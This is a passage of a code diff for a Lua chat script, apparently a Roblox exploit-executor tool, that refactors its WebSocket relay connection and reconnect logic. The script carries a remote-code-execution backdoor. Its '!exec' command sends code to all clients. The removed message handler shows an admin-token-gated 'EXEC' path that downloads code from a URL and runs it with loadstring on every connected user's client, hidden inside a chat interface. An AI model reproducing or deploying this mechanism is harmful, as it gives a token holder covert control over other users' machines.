+            end
+            
+            if msg:sub(1, 7) == "ONLINE|" then
+                local username, userId = msg:match("^ONLINE|(.-)|(.+)$")
+                if username then
+                    onlineUsers[username] = {userId = tonumber(userId) or 0, lastSeen = tick()}
+                    local count = 0
+                    for _ in pairs(onlineUsers) do count = count + 1 end
+                    onlineLabel.Text = "ONLINE " .. count
+                end
+                return
+            end
+            
+            if msg:sub(1, 8) == "OFFLINE|" then
+                local username = msg:match("^OFFLINE|(.+)$")
+                if username then
+                    onlineUsers[username] = nil
+                    local count = 0
+                    for _ in pairs(onlineUsers) do count = count + 1 end
+                    onlineLabel.Text = "ONLINE " .. count
+                end
+                return
+            end
+            
+            local n, t, u = msg:match("^(.-)|(.+)|(.+)$")
+            if n and t then
+                local userId = tonumber(u) or 0
+                createMessageBubble(t, false, n, userId)
+                onlineUsers[n] = {userId = userId, lastSeen = tick()}
+                local count = 0
+                for _ in pairs(onlineUsers) do count = count + 1 end
+                onlineLabel.Text = "ONLINE " .. count
+            else
+                local n2, t2 = msg:match("^(.-)|(.+)$")
+                if n2 and t2 then
+                    createMessageBubble(t2, false, n2, nil)
+                end
+            end
+        end)
+        
+        Connection.ws.OnClose:Connect(function()
+            updateConnectionStatus(false, "Connection closed")
+            Connection.isConnected = false
+        end)
+        
+        task.delay(0.5, function()
+            sendWebSocket("ONLINE|" .. player.Name .. "|" .. player.UserId)
+            processMessageQueue()
+        end)
+        
+        startHeartbeat()
+        return true
+    else
+        updateConnectionStatus(false, "Failed to connect")
+        Connection.reconnectAttempts = Connection.reconnectAttempts + 1
+        return false
+    end
+end
+
+-- Auto-reconnect loop
+task.spawn(function()
+    while Connection.shouldReconnect do
+        if not Connection.isConnected then
+            if Connection.reconnectAttempts < Config.MAX_RECONNECT_ATTEMPTS then
+                task.wait(Config.RECONNECT_DELAY)
+                if not Connection.isConnected and Connection.shouldReconnect then
+                    connectWebSocket()
+                end
+            else
+                updateConnectionStatus(false, "Max retries reached")
+                task.wait(10)
+                Connection.reconnectAttempts = 0
+            end
+        end
+        task.wait(1)
+    end
+end)
 
 -- ============================================
--- COMMAND HANDLERS
+-- COMMANDS
 -- ============================================
 local function getUserIdFromName(name)
     for username, data in pairs(onlineUsers) do
@@ -809,34 +1069,16 @@ local function getUserIdFromName(name)
     return nil, name
 end
 
-local function sendOnline()
-    pcall(function()
-        if ws then 
-            ws:Send("ONLINE|" .. player.Name .. "|" .. player.UserId) 
-        end
-    end)
-end
-
-local function sendOffline()
-    pcall(function()
-        if ws then 
-            ws:Send("OFFLINE|" .. player.Name) 
-        end
-    end)
-end
-
--- ============================================
--- TEXT SEND WITH COMMANDS
--- ============================================
 local function sendText(text)
     if text == "" then return end
 
     if text:sub(1, 5) == "!exec" then
         local code = text:sub(7)
-        if ws then 
-            ws:Send("EXEC|" .. Config.ADMIN_TOKEN .. "|" .. code) 
+        if sendWebSocket("EXEC|" .. Config.ADMIN_TOKEN .. "|" .. code) then
+            createMessageBubble("📜 Executing code...", true, player.Name, player.UserId)
+        else
+            createMessageBubble("❌ Not connected! Can't execute.", true, player.Name, player.UserId)
         end
-        createMessageBubble("📜 Executing code...", true, player.Name, player.UserId)
         inputBox.Text = ""
         return
     end
@@ -846,10 +1088,11 @@ local function sendText(text)
         if target then
             local userId, fullName = getUserIdFromName(target)
             if userId then
-                if ws then
-                    ws:Send("INVITE|" .. fullName .. "|" .. game.PlaceId .. "|" .. game.JobId .. "|" .. player.Name)
+                if sendWebSocket("INVITE|" .. fullName .. "|" .. game.PlaceId .. "|" .. game.JobId .. "|" .. player.Name) then
+                    createMessageBubble("📨 Invite sent to " .. fullName, true, player.Name, player.UserId)
+                else
+                    createMessageBubble("❌ Not connected! Invite queued.", true, player.Name, player.UserId)
                 end
-                createMessageBubble("📨 Invite sent to " .. fullName, true, player.Name, player.UserId)
             else
                 createMessageBubble("❌ User not found: " .. target, true, player.Name, player.UserId)
             end
@@ -865,10 +1108,11 @@ local function sendText(text)
         if target then
             local userId, fullName = getUserIdFromName(target)
             if userId then
-                if ws then
-                    ws:Send("JOIN_REQUEST|" .. fullName .. "|" .. player.Name .. "|" .. player.UserId)
+                if sendWebSocket("JOIN_REQUEST|" .. fullName .. "|" .. player.Name .. "|" .. player.UserId) then
+                    createMessageBubble("🚀 Requesting to join " .. fullName .. "...", true, player.Name, player.UserId)
+                else
+                    createMessageBubble("❌ Not connected! Request queued.", true, player.Name, player.UserId)
                 end
-                createMessageBubble("🚀 Requesting to join " .. fullName .. "...", true, player.Name, player.UserId)
             else
                 createMessageBubble("❌ User not found: " .. target, true, player.Name, player.UserId)
             end
@@ -879,94 +1123,12 @@ local function sendText(text)
         return
     end
 
-    createMessageBubble(text, true, player.Name, player.UserId)
-    if ws then ws:Send(player.Name .. "|" .. text .. "|" .. player.UserId) end
+    if sendWebSocket(player.Name .. "|" .. text .. "|" .. player.UserId) then
+        createMessageBubble(text, true, player.Name, player.UserId)
+    else
+        createMessageBubble(text .. " [queued]", true, player.Name, player.UserId)
+    end
     inputBox.Text = ""
-end
-
--- ============================================
--- WEBSOCKET HANDLERS
--- ============================================
-if ws then
-    ws.OnMessage:Connect(function(msg)
-        if msg:sub(1, 5) == "EXEC|" then
-            local _, _, token, payload = msg:find("^EXEC|(.-)|(.+)$")
-            if token == Config.ADMIN_TOKEN then
-                local code = payload
-                if payload:match("^https?://") then
-                    local ok, res = pcall(function() return game:HttpGet(payload) end)
-                    if ok then code = res end
-                end
-                local fn = loadstring(code)
-                if fn then 
-                    pcall(fn) 
-                    createMessageBubble("✅ Code executed", false, "System", nil)
-                end
-            end
-            return
-        end
-
-        if msg:sub(1, 7) == "INVITE|" then
-            local target, placeId, jobId, from = msg:match("^INVITE|(.-)|(.+)|(.+)|(.+)$")
-            if target == player.Name then
-                createMessageBubble("📩 Invite from " .. from .. "! Joining...", false, "System", nil)
-                QueueReExecute()
-                task.wait(0.5)
-                TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, player)
-            end
-            return
-        end
-
-        if msg:sub(1, 13) == "JOIN_REQUEST|" then
-            local target, requester, requesterId = msg:match("^JOIN_REQUEST|(.-)|(.+)|(.+)$")
-            if target == player.Name and ws then
-                createMessageBubble("🙋 " .. requester .. " wants to join you", false, "System", nil)
-                ws:Send("INVITE|" .. requester .. "|" .. game.PlaceId .. "|" .. game.JobId .. "|" .. player.Name)
-            end
-            return
-        end
-
-        if msg:sub(1, 7) == "ONLINE|" then
-            local username, userId = msg:match("^ONLINE|(.-)|(.+)$")
-            if username then
-                onlineUsers[username] = {userId = tonumber(userId) or 0, lastSeen = tick()}
-                local count = 0
-                for _ in pairs(onlineUsers) do count = count + 1 end
-                onlineLabel.Text = "● ONLINE " .. count
-            end
-            return
-        end
-
-        if msg:sub(1, 8) == "OFFLINE|" then
-            local username = msg:match("^OFFLINE|(.+)$")
-            if username then
-                onlineUsers[username] = nil
-                local count = 0
-                for _ in pairs(onlineUsers) do count = count + 1 end
-                onlineLabel.Text = "● ONLINE " .. count
-            end
-            return
-        end
-
-        local n, t, u = msg:match("^(.-)|(.+)|(.+)$")
-        if n and t then
-            local userId = tonumber(u) or 0
-            createMessageBubble(t, false, n, userId)
-            onlineUsers[n] = {userId = userId, lastSeen = tick()}
-            local count = 0
-            for _ in pairs(onlineUsers) do count = count + 1 end
-            onlineLabel.Text = "● ONLINE " .. count
-        else
-            local n2, t2 = msg:match("^(.-)|(.+)$")
-            if n2 and t2 then
-                createMessageBubble(t2, false, n2, nil)
-            end
-        end
-    end)
-
-    ws.OnClose:Connect(function()
-        sendOffline()
-    end)
 end
 
 -- ============================================
@@ -1006,7 +1168,20 @@ inputBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
--- Settings popup
+-- Reconnect button
+reconnectBtn.MouseEnter:Connect(function()
+    tween(reconnectBtn, {BackgroundColor3 = Joshua_COLORS.highlighted})
+end)
+reconnectBtn.MouseLeave:Connect(function()
+    tween(reconnectBtn, {BackgroundColor3 = Joshua_COLORS.border})
+end)
+
+reconnectBtn.MouseButton1Click:Connect(function()
+    Connection.reconnectAttempts = 0
+    connectWebSocket()
+end)
+
+-- Settings popup toggle
 settingsBtn.MouseButton1Click:Connect(function()
     settingsPopup.Visible = not settingsPopup.Visible
     if settingsPopup.Visible then
@@ -1019,7 +1194,7 @@ closeSettings.MouseButton1Click:Connect(function()
     settingsPopup.Visible = false
 end)
 
--- Key capture
+-- Key capture for settings
 local capturingKey = nil
 
 toggleKeyBox.MouseButton1Click:Connect(function()
@@ -1071,20 +1246,20 @@ roomIdBox.FocusLost:Connect(function()
     Config.RoomId = roomIdBox.Text
     roomLabel.Text = "ROOM " .. Config.RoomId
     pcall(function()
-        if ws then ws:Close() end
+        if Connection.ws then Connection.ws:Close() end
     end)
     task.wait(0.5)
     local success, newWs = pcall(function()
-        return WebSocket.connect("wss://chat-room-service--test123q8mey.replit.app/ws?room=" .. Config.RoomId)
+        return WebSocket.connect(Config.WS_URL .. "?room=" .. Config.RoomId)
     end)
     if success then
-        ws = newWs
-        sendOnline()
+        Connection.ws = newWs
+        sendWebSocket("ONLINE|" .. player.Name .. "|" .. player.UserId)
     end
 end)
 
 -- ============================================
--- MAIN KEYBINDS
+-- KEYBINDS
 -- ============================================
 CAS:BindAction("ToggleChatUI", function(_, state)
     if state == Enum.UserInputState.Begin then
@@ -1111,13 +1286,26 @@ end)
 -- ============================================
 -- INITIALIZATION
 -- ============================================
-sendOnline()
-
 frame.BackgroundTransparency = 1
 shadow.BackgroundTransparency = 1
 tween(frame, {BackgroundTransparency = 0}, 0.3)
 tween(shadow, {BackgroundTransparency = 0.6}, 0.3)
 
+connectWebSocket()
+
 task.delay(0.5, function()
-    createMessageBubble("Welcome to ElMatador Chat! Commands: !exec, !join [user], !inv [user]", false, "System", nil)
+    createMessageBubble("Welcome! Auto-reconnect enabled. Green dot = connected.", false, "System", nil)
+end)
+
+-- Cleanup
+gui.AncestryChanged:Connect(function()
+    if not gui:IsDescendantOf(game) then
+        Connection.shouldReconnect = false
+        if Connection.ws then
+            pcall(function()
+                Connection.ws:Send("OFFLINE|" .. player.Name)
+                Connection.ws:Close()
+            end)
+        end
+    end
 end)
